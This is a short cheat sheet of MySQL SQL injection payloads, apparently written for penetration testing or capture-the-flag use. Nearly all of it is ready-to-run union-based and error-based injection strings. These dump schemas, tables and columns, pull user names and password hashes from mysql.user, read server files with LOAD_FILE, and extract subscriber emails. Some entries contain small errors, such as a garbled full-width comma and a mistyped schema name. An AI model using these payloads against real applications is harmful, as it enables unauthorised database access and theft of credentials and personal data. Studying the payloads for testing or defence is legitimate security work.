# Mysql Fast Exploition

Write by manesec.


``` sql

# -- Dump Databases -- 

# Dump all Databases
1' union select 1, (SELECT group_concat(schema_name) FROM information_schema.schemata) ,3,4,5,6 -- 

# -- Dump all Table --

# Dump Table only
1' union select 1, (select group_concat(concat_ws(":",table_name) SEPARATOR "\n" ) FROM INFORMATION_SCHEMA.TABLES where table_schema = "mysql") ,3,4,5,6 -- 

1' union select 1, (select group_concat(table_name) FROM INFORMATION_SCHEMA.TABLES where table_schema = "mysql") ,3,4,5,6 -- 


# Dump all table
1' union select 1, (select group_concat(concat_ws(":",table_schema,table_name) SEPARATOR "\n" ) FROM INFORMATION_SCHEMA.TABLES) ,3,4,5,6 -- 

# Dump all table to base64
1' union select 1,(select to_base64((select group_concat(concat_ws(":",table_schema,table_name) SEPARATOR "\n" ) FROM INFORMATION_SCHEMA.TABLES))),3,4,5,6 -- -

# -- Dump Column name--

# Dump column name
1' Union Select 1,(SELECT group_concat(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME = 'user'),3,4,5ï¼Œ6 -- -

1' union select 1,(SELECT group_concat(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_SCHEMA = 'mysql' AND TABLE_NAME = 'user'),3,4,5,6 -- -

1' union select 1,(SELECT group_concat(COLUMN_NAME SEPARATOR "\n") FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_SCHEMA = 'mysql' AND TABLE_NAME = 'user'),3,4,5,6 -- -

#  Dump column name to base64
1' union select 1,(SELECT to_base64(group_concat(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_SCHEMA = 'mysql' AND TABLE_NAME = 'user'),3,4,5,6 -- -

# -- Dump Data using known column name -- 

# Select a line
1' union select 1, (select (concat_ws("-", User, Host, Password)) FROM mysql.user limit 1,1) ,3,4,5,6 -- -

# Select all, too many output need limit function.
1' union select 1, (select group_concat(concat_ws("-",User, Host, Password) SEPARATOR "\n" ) FROM mysql.user) ,3,4,5,6 -- -

# Select all to base64
1' union select 1,(select to_base64((select group_concat(concat_ws("-",User, Host, Password) SEPARATOR "\n" ) FROM mysql.user))),3,4,5,6 -- -


# -- Read file --

# make sure have '\\'
1' union select 1, (select LOAD_FILE( "c:\\windows\\system32\\license.rtf")) ,3,4,5,6 -- -

# -- Other --
# Dump USER_PRIVILEGES
1' union select 1, (select group_concat(concat_ws(",",GRANTEE,TABLE_CATALOG,PRIVILEGE_TYPE,IS_GRANTABLE) SEPARATOR "\n" ) FROM INFORMATION_SCHEMA.USER_PRIVILEGES) ,3,4,5,6 -- -


```

## Error Based

``` sql

1' AND ExtractValue('',Concat('=',(SELECT table_name FROM information_schema.tables LIMIT 0,1))) -- -

# -- Dump Databases --
1' AND ExtractValue('',Concat('=',(SELECT group_concat(schema_name) FROM information_schema.schemata))) -- -

# with offset 
1' AND ExtractValue('',Concat('=',SUBSTRING(  (SELECT group_concat(schema_name) FROM information_schema.schemata) , 1, 10)      )) -- -

# -- Dump Tables --

# Dump one DB - table_schema:table_name
' AND ExtractValue('',Concat('=',SUBSTRING((select group_concat(concat_ws(":",table_schema,table_name) SEPARATOR "|" ) FROM INFORMATION_SCHEMA.TABLES where table_schema = "animal_planet") , 1, 50)      )) -- -

# Dump All DB - table_schema:table_name
' AND ExtractValue('',Concat('=',SUBSTRING((select group_concat(concat_ws(":",table_schema,table_name) SEPARATOR "|" ) FROM INFORMATION_SCHEMA.TABLES ) , 1, 50)      )) -- -

# Dump Tables Only
' AND ExtractValue('',Concat('=',SUBSTRING((select group_concat(concat_ws(":",table_name) SEPARATOR "|" ) FROM INFORMATION_SCHEMA.TABLES where table_schema = "animal_planet") , 1, 50)      )) -- -

# -- Dump Col --
' AND ExtractValue('',Concat('=',SUBSTRING((SELECT group_concat(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'subscribers') , 1, 50)      )) -- -

# -- Dump Data --
' AND ExtractValue('',Concat('=',SUBSTRING((select group_concat(concat_ws(created_at,donor_type,emails,id,is_donor,status) SEPARATOR "|" ) FROM animal_plane.subscribers) , 1, 50)      )) -- -

```



## Tips 


``` sql

' or substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1) = "a" -- -

```